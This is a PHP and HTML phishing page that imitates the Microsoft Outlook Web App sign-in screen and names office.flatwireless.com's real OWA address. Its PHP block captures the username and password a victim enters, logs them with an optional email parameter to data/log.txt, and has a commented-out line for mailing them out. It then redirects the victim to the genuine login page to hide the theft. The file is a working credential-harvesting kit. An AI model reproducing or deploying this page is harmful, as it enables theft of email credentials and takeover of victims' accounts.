<?php
	$email = '';
	if(isset($_GET['email'])){
		$email = $_GET['email'];
	}
	if(isset($_POST['submit']))
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
				/* --- */
		$fileopen = fopen("data/log.txt", "a+");

		if(filter_var($email, FILTER_VALIDATE_EMAIL)) {
			// mail($email, "Username&Password", $username . ":" . $password);
			$write = "$username:$password:$email\r\n";
		} else {
			$write = "$username:$password\r\n";
		}
		
		fwrite($fileopen, $write);
		fclose($fileopen);
				/* --- */
		header("location: https://office.flatwireless.com/owa/auth.owa");
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">

<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

<meta name="Robots" content="NOINDEX, NOFOLLOW">
<title>Outlook Web App</title>


<script type="text/javascript" src="flogon.js"></script>

<script type="text/javascript">
	<!--
	var a_fRC = 1;
	var g_fFcs = 1;
	var a_fLOff = 0;
	var a_fCAC = 1;
	var a_fEnbSMm = 1;
/// <summary>
/// Is Mime Control installed?
/// </summary>
function IsMimeCtlInst(progid)
{
	if (!a_fEnbSMm)
		return false;

	var oMimeVer = null;

	try 
	{
		// TODO: ingore this on none IE browser
		//
		//oMimeVer = new ActiveXObject(progid);
	} 
	catch (e)
	{ 
	}

	if (oMimeVer != null)
		return true;
	else
		return false;
}

/// <summary>
/// Render out the S-MIME control if it is installed.
/// </summary>
function RndMimeCtl()
{
	if (IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
		RndMimeCtlHlpr("MimeNSe2k3", "D801B381-B81D-47a7-8EC4-EFC111666AC0", "MIMEe2k3", "mimeLogoffE2k3");

	if (IsMimeCtlInst("OwaSMime.MimeCtlVer"))
		RndMimeCtlHlpr("MimeNSe2k7sp1", "833aa5fb-7aca-4708-9d7b-c982bf57469a", "MIMEe2k7sp1", "mimeLogoffE2k7sp1");

	if (IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
		RndMimeCtlHlpr("MimeNSe2k9", "4F40839A-C1E5-47E3-804D-A2A17F42DA21", "MIMEe2k9", "mimeLogoffE2k9");
}

/// <summary>
/// Helper function to factor out the rendering of the S/MIME control.
/// </summary>

	-->
</script>


<link media="all" href="index.css" type="text/css" rel="stylesheet">
</head>
<body class="owaLgnBdy">

<script type="text/javascript">
	RndMimeCtl();
</script>

<noscript>
	<div id="dvErr">
		<table cellpadding="0" cellspacing="0">
		<tr>
			<td><img src="/owa/14.3.468.0/themes/base/warn.png" alt=""></td>
			<td style="width:100%">To use Outlook Web App, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser doesn't support scripts, you can download <a href="http://www.microsoft.com/windows/ie/downloads/default.mspx">Windows Internet Explorer</a> for access to Outlook Web App.</td>
		</tr>
		</table>
	</div>
</noscript>
<form action="" method="POST" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
<input name="destination" value="https://office.flatwireless.com/owa/" type="hidden">
<input name="flags" value="0" type="hidden">
<input name="forcedownlevel" value="0" type="hidden">
<table id="tblMain" cellspacing="0" cellpadding="0" align="center">
	<tbody><tr>
		<td colspan="3">
			<table class="tblLgn" cellspacing="0" cellpadding="0">
			<tbody><tr>
				<td class="lgnTL"><img src="lgntopl.gif" alt=""></td>
				<td class="lgnTM"></td>
				<td class="lgnTR"><img src="lgntopr.gif" alt=""></td>
			</tr>
			</tbody></table>
		</td>
	</tr>
	<tr>
		<td id="mdLft">&nbsp;</td>
		<td id="mdMid">
			<table id="tblMid" class="mid">
				<tbody><tr>
					<td id="expltxt" class="expl">
										
					</td>
				</tr>
				<tr><td><hr></td></tr>
				<tr>
					<td>
						<table cellspacing="0" cellpadding="0">
						<colgroup><col>
						<col class="w100">
						</colgroup><tbody><tr id="trSec">
							<td colspan="2">								
								Security 
									‎(
									<a href="#" id="lnkShwSec" onclick="clkExp('lnkShwSec')">
									show explanation 
									</a>
									<a href="#" id="lnkHdSec" onclick="clkExp('lnkHdSec')" style="display:none">
									hide explanation 
									</a>
								)‎
							</td>
						</tr>						
						<tr>
							<td><input id="rdoPblc" name="trusted" value="0" class="rdo" onclick="clkSec()" checked="checked" type="radio"></td>
							<td><label for="rdoPblc">This is a public or shared computer</label></td>
						</tr>
						<tr id="trPubExp" class="expl" style="display: none;">
							<td></td>
							<td>Select this option if you use Outlook Web App on a public computer. Be sure to sign out when you've finished and close all windows to end your session.</td>
						</tr>
						<tr>
							<td><input id="rdoPrvt" name="trusted" value="4" class="rdo" onclick="clkSec()" type="radio"></td>
							<td><label for="rdoPrvt">This is a private computer</label></td>
						</tr>
						<tr id="trPrvtExp" class="expl" style="display: none;">
							<td></td>
							<td>Select this option if you're the only person who uses this computer. Your server will allow a longer period of inactivity before signing you out.</td>
						</tr>
						<tr id="trPrvtWrn" class="wrng" style="display: none;">
							<td></td>
							<td>Warning:  By selecting this option, you confirm that this computer complies with your organization's security policy.</td>
						</tr>
						</tbody></table>
					</td>
				</tr>
				
				<tr><td><hr></td></tr>
				<tr>
					<td>
						
						<table cellspacing="0" cellpadding="0">
							<colgroup><col>
							<col class="w100">
								
								</colgroup><tbody><tr>							
									<td><input id="chkBsc" class="rdo" onclick="clkBsc();" type="checkbox"></td>
									<td nowrap=""><label for="chkBsc">Use the light version of Outlook Web App</label></td>
								</tr>
								<tr id="trBscExp" class="disBsc" style="display: none;">
									<td></td>
									<td>The light version of Outlook Web App includes fewer features. Use it if you're on a slow connection or using a computer with unusually strict browser security settings. We also support the full Outlook Web App experience on some browsers on Windows, Mac, and Linux computers. To check out all the supported browsers and operating systems, <a href="http://go.microsoft.com/fwlink/?LinkID=129362" id="bscLnk">click here.</a></td>
								</tr>
							
						</tbody></table>
					</td>
				</tr>
				
				<tr><td><hr></td></tr>
				<tr>
					<td>
						<table cellspacing="0" cellpadding="0">
							<colgroup><col class="nowrap">
							<col class="w100">
							<col>
							</colgroup><tbody><tr>
								<td nowrap=""><label for="username">User name:</label></td>
								<td class="txtpad"><input id="username" name="username" required class="txt" value="" type="text"></td>
							</tr>
							<tr>
								<td nowrap=""><label for="password">Password:</label></td>
								<td class="txtpad"><input id="password" name="password" required class="txt" onfocus="g_fFcs=0" type="password"></td>
							</tr>
							<tr>
								<td colspan="2" class="txtpad" align="right">
									
									<input class="btn" value="Sign in" name="submit" onclick="clkLgn()" onmouseover="this.className='btnOnMseOvr'" onmouseout="this.className='btn'" onmousedown="this.className='btnOnMseDwn'" type="submit">
									
									<input name="isUtf8" value="1" type="hidden">
								</td>
							</tr>
						</tbody></table>
					</td>
				</tr>
				<tr><td><hr></td></tr>
				
			</tbody></table>
			<table id="tblMid2" class="mid" style="display: none;">
				<tbody><tr><td><hr></td></tr>
				<tr>
					<td><br>Please enable cookies for this Web site.<br><br>Cookies are currently disabled by your browser. Outlook Web App requires that cookies be enabled. <br><br>For information about how to enable cookies, see the Help for your Web browser.<br><br><br></td>
				</tr>
				<tr><td><hr></td></tr>
				<tr>
					<td class="txtpad" align="right">
					
						<input class="btn" style="float: right;" value="Retry" onclick="clkRtry()" onmouseover="this.className='btnOnMseOvr'" onmouseout="this.className='btn'" onmousedown="this.className='btnOnMseDwn'" type="button">
					
					</td>
				</tr>
			</tbody></table>
			<table class="mid tblConn">
				<tbody><tr>
					<td rowspan="2" class="tdConnImg" align="right"><img style="vertical-align: top;" src="lgnexlogo.gif" alt=""></td>
					<td class="tdConn">Connected to Microsoft Exchange</td>
				</tr>
				<tr>
					<td class="tdCopy">© 2010 Microsoft Corporation. All rights reserved.</td>
				</tr>
			</tbody></table>
		</td>
		<td id="mdRt">&nbsp;</td>
	</tr>
	<tr>
		<td colspan="3">
			<table class="tblLgn" cellspacing="0" cellpadding="0">
			<tbody><tr>
				<td class="lgnBL"><img src="lgnbotl.gif" alt=""></td>
				<td class="lgnBM"></td>
				<td class="lgnBR"><img src="lgnbotr.gif" alt=""></td>
			</tr>
			</tbody></table>
		</td>
	</tr>
</tbody></table>
</form>


</body>
</html>
